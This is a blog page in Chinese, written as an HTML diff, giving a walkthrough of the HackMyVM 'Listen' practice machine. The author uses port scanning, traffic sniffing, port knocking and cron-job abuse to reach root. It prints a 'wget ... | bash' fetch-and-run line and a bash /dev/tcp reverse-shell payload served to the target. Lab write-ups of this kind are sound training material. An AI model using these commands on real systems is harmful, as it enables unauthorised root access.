@@ -1,0 +1,600 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/letter-k.svg">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/letter-k.svg">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"guayu-kakeru.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":"ture","show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="HMV-Listen靶场复盘本来想先做Vulnyx的Listen但是我用平时的方法修改不了ip，做不了">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HMV-Listen">
+<meta property="og:url" content="https://guayu-kakeru.github.io/posts/24112.html">
+<meta property="og:site_name" content="guayu-kakeru">
+<meta property="og:description" content="HMV-Listen靶场复盘本来想先做Vulnyx的Listen但是我用平时的方法修改不了ip，做不了">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67a6bd2bd0e0a243d4fcdfd2.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67a6cd6fd0e0a243d4fce6f1.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67a6cd6bd0e0a243d4fce6ef.png">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/67a6cd85d0e0a243d4fce6f5.png">
+<meta property="article:published_time" content="2025-02-08T02:07:09.000Z">
+<meta property="article:modified_time" content="2025-02-08T10:21:56.750Z">
+<meta property="article:author" content="guayu-kakeru">
+<meta property="article:tag" content="渗透">
+<meta property="article:tag" content="HMV">
+<meta property="article:tag" content="靶场">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pic1.imgdb.cn/item/67a6bd2bd0e0a243d4fcdfd2.png">
+
+<link rel="canonical" href="https://guayu-kakeru.github.io/posts/24112.html">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>HMV-Listen | guayu-kakeru</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">guayu-kakeru</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">12</span></a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">9</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">44</span></a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://guayu-kakeru.github.io/posts/24112.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="guayu-kakeru">
+      <meta itemprop="description" content="一年过后，你会希望从今天就开始行动。">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="guayu-kakeru">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          HMV-Listen
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2025-02-08 10:07:09 / 修改时间：18:21:56" itemprop="dateCreated datePublished" datetime="2025-02-08T10:07:09+08:00">2025-02-08</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E9%9D%B6%E5%9C%BA/" itemprop="url" rel="index"><span itemprop="name">靶场</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E9%9D%B6%E5%9C%BA/hmv/" itemprop="url" rel="index"><span itemprop="name">hmv</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+      
+        <div class="out-img-topic">
+          <img src="https://pic1.imgdb.cn/item/67a6cdd0d0e0a243d4fce703.png" class="img-topic">
+        </div>
+      
+      
+        <p>HMV-Listen靶场复盘<br>本来想先做Vulnyx的Listen但是我用平时的方法修改不了ip，做不了</p>
+<span id="more"></span>
+<p><img src="https://pic1.imgdb.cn/item/67a6bd2bd0e0a243d4fcdfd2.png"></p>
+<h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LIVECODESERVER"><figure class="iseeu highlight /livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─<span class="comment"># nmap -A 192.168.179.158       </span></span><br><span class="line">Starting Nmap <span class="number">7.95</span> ( <span class="keyword">https</span>://nmap.org ) <span class="keyword">at</span> <span class="number">2025</span><span class="number">-02</span><span class="number">-08</span> <span class="number">10</span>:<span class="number">13</span> CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">192.168</span><span class="number">.179</span><span class="number">.158</span> (<span class="number">192.168</span><span class="number">.179</span><span class="number">.158</span>)</span><br><span class="line">Host is up (<span class="number">0.0022</span>s latency).</span><br><span class="line">Not shown: <span class="number">998</span> closed tcp ports (reset)</span><br><span class="line">PORT   STATE    SERVICE VERSION</span><br><span class="line"><span class="number">22</span>/tcp filtered ssh</span><br><span class="line"><span class="number">80</span>/tcp filtered <span class="keyword">http</span></span><br><span class="line">MAC Address: <span class="number">56</span>:<span class="number">6</span>C:<span class="number">79</span>:<span class="number">7</span>A:<span class="number">84</span>:<span class="number">65</span> (Unknown)</span><br><span class="line">Too many fingerprints match this host <span class="built_in">to</span> give specific OS details</span><br><span class="line">Network Distance: <span class="number">1</span> hop</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line"><span class="number">1</span>   <span class="number">2.22</span> ms <span class="number">192.168</span><span class="number">.179</span><span class="number">.158</span> (<span class="number">192.168</span><span class="number">.179</span><span class="number">.158</span>)</span><br><span class="line"></span><br><span class="line">OS <span class="keyword">and</span> Service detection performed. Please report <span class="keyword">any</span> incorrect results <span class="keyword">at</span> <span class="keyword">https</span>://nmap.org/submit/ .</span><br><span class="line">Nmap done: <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">3.20</span> <span class="built_in">seconds</span></span><br></pre></td></tr></table></figure></div>
+<h1 id="web探测"><a href="#web探测" class="headerlink" title="web探测"></a>web探测</h1><p>web首页没有什么信息</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# curl 192.169.179.158    </span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">META</span> <span class="attr">HTTP-EQUIV</span>=<span class="string">&quot;Cache-control&quot;</span> <span class="attr">CONTENT</span>=<span class="string">&quot;no-cache&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">META</span> <span class="attr">HTTP-EQUIV</span>=<span class="string">&quot;refresh&quot;</span> <span class="attr">CONTENT</span>=<span class="string">&quot;0;URL=/cgi-sys/defaultwebpage.cgi&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
+<p>做之前群主有提醒，Listen这个名字就是要流量监听，所以用wireshark<br>wireshark这个应用我直接打开监听，提示我权限不足，搜索后用sudo打开 （mac系统）</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SWIFT"><figure class="iseeu highlight /swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(base) kakeru<span class="meta">@bogon</span> <span class="regexp">/Applications % sudo /</span><span class="type">Applications</span><span class="regexp">/Wireshark.app/</span><span class="type">Contents</span><span class="regexp">/MacOS/</span><span class="type">Wireshark</span></span><br></pre></td></tr></table></figure></div>
+<p><img src="https://pic1.imgdb.cn/item/67a6cd6fd0e0a243d4fce6f1.png"><br>抓包后筛选靶机的ip，查看包内容，发现需要knock 1337端口，用到了knock服务，我要去修改一下这个配置<br>因为开机前获取不到ip，修改了靶机网卡，knock配置也要改 位置在&#x2F;etc&#x2F;knockd.conf<br><img src="https://pic1.imgdb.cn/item/67a6cd6bd0e0a243d4fce6ef.png"><br>另一个包给了用户名和密码<br>konck这个端口之后，靶机的22和80端口就都打开了</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LIVECODESERVER"><figure class="iseeu highlight /livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─<span class="comment"># knock 192.168.179.158 1337 -v          </span></span><br><span class="line">hitting tcp <span class="number">192.168</span><span class="number">.179</span><span class="number">.158</span>:<span class="number">1337</span></span><br><span class="line">                                                                                                                     </span><br><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─<span class="comment"># nmap -p- 192.168.179.158</span></span><br><span class="line">Starting Nmap <span class="number">7.95</span> ( <span class="keyword">https</span>://nmap.org ) <span class="keyword">at</span> <span class="number">2025</span><span class="number">-02</span><span class="number">-08</span> <span class="number">10</span>:<span class="number">29</span> CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">192.168</span><span class="number">.179</span><span class="number">.158</span> (<span class="number">192.168</span><span class="number">.179</span><span class="number">.158</span>)</span><br><span class="line">Host is up (<span class="number">0.00061</span>s latency).</span><br><span class="line">Not shown: <span class="number">65533</span> closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line"><span class="number">22</span>/tcp <span class="built_in">open</span>  ssh</span><br><span class="line"><span class="number">80</span>/tcp <span class="built_in">open</span>  <span class="keyword">http</span></span><br><span class="line">MAC Address: <span class="number">56</span>:<span class="number">6</span>C:<span class="number">79</span>:<span class="number">7</span>A:<span class="number">84</span>:<span class="number">65</span> (Unknown)</span><br><span class="line"></span><br><span class="line">Nmap done: <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">2.77</span> <span class="built_in">seconds</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+<p>然后就可以用ssh登录到silence用户</p>
+<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>没有sudo权限<br>但是suid有一个home目录下leo用户的文件有suid</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CRYSTAL"><figure class="iseeu highlight /crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">silence<span class="variable">@listen</span>:~<span class="variable">$ </span>find / -perm -<span class="number">4000</span> -user root -print <span class="number">2</span>&gt;<span class="regexp">/dev/null</span></span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/mount</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/gpasswd</span></span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/passwd</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/chsh</span></span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/chfn</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/umount</span></span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/newgrp</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/su</span></span><br><span class="line"><span class="regexp">/usr/lib</span><span class="regexp">/eject/dmcrypt</span>-get-device</span><br><span class="line"><span class="regexp">/usr/lib</span><span class="regexp">/openssh/ssh</span>-keysign</span><br><span class="line"><span class="regexp">/usr/lib</span><span class="regexp">/dbus-1.0/dbus</span>-daemon-launch-helper</span><br><span class="line"><span class="regexp">/home/leo</span><span class="regexp">/poem</span></span><br><span class="line"><span class="regexp">silence@listen:~$ cd /home</span></span><br><span class="line">silence<span class="variable">@listen</span>:<span class="regexp">/home$ ls</span></span><br><span class="line"><span class="regexp">leo  listen  silence</span></span><br></pre></td></tr></table></figure></div>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">silence<span class="variable">@listen</span><span class="symbol">:/home</span><span class="variable">$ </span>cd silence/</span><br><span class="line">silence<span class="variable">@listen</span><span class="symbol">:~</span><span class="variable">$ </span>ls</span><br><span class="line">listen.sh  note.txt</span><br><span class="line">silence<span class="variable">@listen</span><span class="symbol">:~</span><span class="variable">$ </span>listen.sh</span><br><span class="line">-<span class="symbol">bash:</span> <span class="symbol">listen.sh:</span> command <span class="keyword">not</span> found</span><br><span class="line">silence<span class="variable">@listen</span><span class="symbol">:~</span><span class="variable">$ </span>cat note.txt </span><br><span class="line"><span class="string">&quot;listen&quot;</span> told me that <span class="keyword">if</span> I listen, I will hear his password....</span><br></pre></td></tr></table></figure></div>
+<p>提示listen “listen”用户可以得到密码</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="D"><figure class="iseeu highlight /d"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">silence<span class="keyword">@listen</span>:~$ cat listen.sh </span><br><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">cat /home/listen/password.txt &gt; /dev/pts/<span class="number">4</span></span><br></pre></td></tr></table></figure></div>
+<p>运行这个脚本之后就可以得到密码，但是现在没有执行权限，只是可读的<br>这里卡住了一会，看了下wp，原来这个pts&#x2F;4 是终端的窗口，所以开4个终端窗口，在第四个终端中就能看到<br>这个应该是个定时任务，等待一会就会在第四个终端窗口中出现密码(开四个ssh全都连接到silence)<br><img src="https://pic1.imgdb.cn/item/67a6cd85d0e0a243d4fce6f5.png"></p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">silence<span class="variable">@listen</span><span class="symbol">:~</span><span class="variable">$ </span>su - listen</span><br><span class="line"><span class="symbol">Password:</span> </span><br><span class="line">listen<span class="variable">@listen</span><span class="symbol">:~</span><span class="variable">$ </span></span><br></pre></td></tr></table></figure></div>
+<p>成功切换到listen<br>有一个文件 ，而且用pspy64发现root会定时执行这个listentome.sh </p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">listen</span>@listen:~$ ls</span><br><span class="line"><span class="attribute">listentome</span>.sh  password.txt  user.txt</span><br><span class="line"><span class="attribute">listen</span>@listen:~$ cat listentome.sh </span><br><span class="line"><span class="attribute">wget</span> -O - -q http://listen/ihearyou.sh | bash</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="attribute">2025</span>/<span class="number">02</span>/<span class="number">07</span> <span class="number">22</span>:<span class="number">14</span>:<span class="number">02</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">1070</span>   | sh /home/listen/listentome.sh </span><br><span class="line"><span class="attribute">2025</span>/<span class="number">02</span>/<span class="number">07</span> <span class="number">22</span>:<span class="number">14</span>:<span class="number">02</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">1071</span>   | sh /home/listen/listentome.sh </span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+<p>这个马上就有思路了，修改host，把listen指向我们本机的http服务，把反弹shell的sh文件让靶机执行</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ACCESSLOG"><figure class="iseeu highlight /accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="number">127.0.0.1</span>       localhost</span><br><span class="line"><span class="number">192.168.179.11</span>  listen</span><br><span class="line"></span><br><span class="line"># The following lines are desirable for IPv6 capable hosts</span><br><span class="line">::<span class="number">1</span>     localhost ip6-localhost ip6-loopback</span><br><span class="line">ff02::<span class="number">1</span> ip6-allnodes</span><br><span class="line">ff02::<span class="number">2</span> ip6-allrouters</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+<p>ctrl + o 回车 ctrl + x</p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">┌──<span class="params">(root㉿kakeru)</span>-[~<span class="string">/tmp</span>]</span><br><span class="line">└─<span class="comment"># rm ihearyou.sh         </span></span><br><span class="line">                                                                                                                     </span><br><span class="line">┌──<span class="params">(root㉿kakeru)</span>-[~<span class="string">/tmp</span>]</span><br><span class="line">└─<span class="comment"># touch ihearyou.sh</span></span><br><span class="line">                                                                                                                     </span><br><span class="line">┌──<span class="params">(root㉿kakeru)</span>-[~<span class="string">/tmp</span>]</span><br><span class="line">└─<span class="comment"># cp reverse.sh ihearyou.sh</span></span><br><span class="line">                                                                                                                     </span><br><span class="line">┌──<span class="params">(root㉿kakeru)</span>-[~<span class="string">/tmp</span>]</span><br><span class="line">└─<span class="comment"># cat ihearyou.sh          </span></span><br><span class="line">bash -i &gt;&amp; <span class="string">/dev/tcp/192.168.179.11/1234</span> 0&gt;&amp;1</span><br><span class="line">                                                                                                                     </span><br><span class="line">┌──<span class="params">(root㉿kakeru)</span>-[~<span class="string">/tmp</span>]</span><br><span class="line">└─<span class="comment"># python3 -m http.server 80</span></span><br><span class="line">Serving HTTP on 0.0.0.0 port 80 <span class="params">(http://0.0.0.0:80/)</span> <span class="string">...</span></span><br></pre></td></tr></table></figure>
+<p>然后在另一个kali端口监听</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# nc -lp 1234             </span><br><span class="line">id</span><br><span class="line">bash: cannot <span class="built_in">set</span> terminal process<span class="built_in"> group </span>(1123): Inappropriate ioctl <span class="keyword">for</span> device</span><br><span class="line">bash: <span class="literal">no</span> job control <span class="keyword">in</span> this shell</span><br><span class="line">root@listen:~# id</span><br><span class="line"><span class="attribute">uid</span>=0(root) <span class="attribute">gid</span>=0(root) <span class="attribute">groups</span>=0(root)</span><br><span class="line">root@listen:~# </span><br></pre></td></tr></table></figure></div>
+<p>完成</p>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>guayu-kakeru
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://guayu-kakeru.github.io/posts/24112.html" title="HMV-Listen">https://guayu-kakeru.github.io/posts/24112.html</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%B8%97%E9%80%8F/" rel="tag"># 渗透</a>
+              <a href="/tags/HMV/" rel="tag"># HMV</a>
+              <a href="/tags/%E9%9D%B6%E5%9C%BA/" rel="tag"># 靶场</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/posts/20816.html" rel="prev" title="HMV-hero">
+      <i class="fa fa-chevron-left"></i> HMV-hero
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/posts/11143.html" rel="next" title="HMV-suidy">
+      HMV-suidy <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="nav-text">端口扫描</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web%E6%8E%A2%E6%B5%8B"><span class="nav-text">web探测</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-text">提权</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="guayu-kakeru"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">guayu-kakeru</p>
+  <div class="site-description" itemprop="description">一年过后，你会希望从今天就开始行动。</div>
+</div>
